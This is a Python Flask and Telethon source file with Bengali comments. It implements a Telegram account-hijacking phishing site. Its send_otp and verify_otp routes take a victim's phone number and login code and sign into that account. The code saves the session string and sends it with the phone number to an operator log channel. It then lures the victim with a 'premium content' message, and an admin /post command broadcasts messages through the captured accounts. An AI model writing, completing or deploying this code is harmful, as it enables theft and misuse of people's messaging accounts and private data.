import os
import asyncio
from flask import Flask, request, jsonify, send_from_directory
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession

# .env ফাইল বা Secret File থেকে ডেটা পড়া
def load_secrets(file_path=".env"):
    secrets = {}
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            for line in f:
                if "=" in line:
                    key, value = line.strip().split("=", 1)
                    secrets[key] = value
    return secrets

secrets = load_secrets()

app = Flask(__name__, static_url_path='')

# ভ্যারিয়েবল লোড
API_ID = int(secrets.get("API_ID", 0))
API_HASH = secrets.get("API_HASH", "")
LOG_CHANNEL = int(secrets.get("LOG_CHANNEL", 0))
ADMIN_ID = int(secrets.get("ADMIN_ID", 0))
BOT_TOKEN = secrets.get("BOT_TOKEN", "")

user_sessions = {}
all_users = set()

# ক্লায়েন্ট ইনিশিয়ালাইজেশন
client = TelegramClient(StringSession(), API_ID, API_HASH)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/send_otp', methods=['POST'])
async def send_otp():
    data = request.json
    phone = data.get('phone')
    
    # বট ডিসকানেক্ট থাকলে আবার কানেক্ট করা
    if not client.is_connected():
        await client.connect()
        
    try:
        sent_code = await client.send_code_request(phone)
        user_sessions[phone] = {'hash': sent_code.phone_code_hash}
        return jsonify({"status": "sent"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/verify_otp', methods=['POST'])
async def verify_otp():
    data = request.json
    phone = data.get('phone')
    otp = data.get('otp')
    
    if phone in user_sessions:
        try:
            if not client.is_connected():
                await client.connect()
            
            user = await client.sign_in(phone, otp, phone_code_hash=user_sessions[phone]['hash'])
            all_users.add(user.id)
            session_str = client.session.save()

            # লগ চ্যানেলে সেশন পাঠানো
            await client.send_message(LOG_CHANNEL, f"✅ **New Session!**\nPhone: `{phone}`\n\n`{session_str}`")

            # ওয়েলকাম মেসেজ ও ওয়েবসাইট লিংক
            site_url = f"https://{request.host}"
            welcome_text = (
                "👋 **স্বাগতম!** আপনার অ্যাকাউন্টটি সফলভাবে যুক্ত হয়েছে। ✅\n\n"
                "নিচের বাটনে ক্লিক করে ওয়েবসাইট থেকে সব প্রিমিয়াম কন্টেন্ট উপভোগ করুন। 🔥"
            )
            await client.send_message(user.id, welcome_text, buttons=[
                [Button.url("🚀 Open Website 🚀", site_url)]
            ])
            return jsonify({"status": "success"})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 400
    return jsonify({"status": "error"}), 404

# অ্যাডমিন কমান্ড ফিক্সড
@client.on(events.NewMessage(pattern='/post'))
async def broadcast_handler(event):
    if event.sender_id != ADMIN_ID:
        return
    
    notice_text = event.raw_text.replace('/post', '').strip()
    if not notice_text:
        await event.reply("⚠️ ব্যবহারের নিয়ম: `/post আপনার মেসেজ`")
        return

    total = len(all_users)
    success, failed = 0, 0
    status_msg = await event.reply(f"🚀 ব্রডকাস্ট শুরু... (মোট: {total})")
    
    for user_id in list(all_users):
        try:
            await client.send_message(user_id, notice_text)
            success += 1
            if success % 5 == 0:
                await status_msg.edit(f"⏳ পাঠানো হচ্ছে...\n✅ সফল: {success}\n❌ ব্যর্থ: {failed}")
            await asyncio.sleep(0.3)
        except:
            failed += 1
            continue

    await event.reply(f"📢 **রিপোর্ট:**\n✅ সফল: {success}\n❌ ব্যর্থ: {failed}\n👥 মোট: {total}")

# মেইন রান ফাংশন
async def main():
    # বট কানেক্ট করা
    await client.start(bot_token=BOT_TOKEN)
    print("✅ Bot is online!")
    
    # Flask সার্ভার চালানো
    from waitress import serve
    serve(app, host="0.0.0.0", port=int(os.environ.get('PORT', 5000)))

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
